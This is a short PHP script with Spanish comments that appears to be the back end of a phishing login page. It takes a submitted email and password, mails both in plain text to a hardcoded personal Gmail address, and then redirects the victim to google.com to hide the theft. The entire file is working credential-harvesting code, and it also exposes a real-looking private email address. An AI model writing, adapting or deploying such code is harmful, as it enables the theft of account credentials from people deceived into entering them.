<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email = $_POST['email'];
  $password = $_POST['password'];

  // Destinatario y asunto del correo
  $destinatario = "luisnoe.rodriguez09@gmail.com"; // Reemplaza con tu dirección de correo
  $asunto = "Datos de inicio de sesión";

  // Cuerpo del correo
  $mensaje = "Correo electrónico: $email\n";
  $mensaje .= "Contraseña: $password\n";

  // Cabeceras adicionales
  $cabeceras = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

  // Envío del correo
  mail($destinatario, $asunto, $mensaje, $cabeceras);

  // Redirección después del envío del correo
  header("Location: https://www.google.com");
  exit();
}
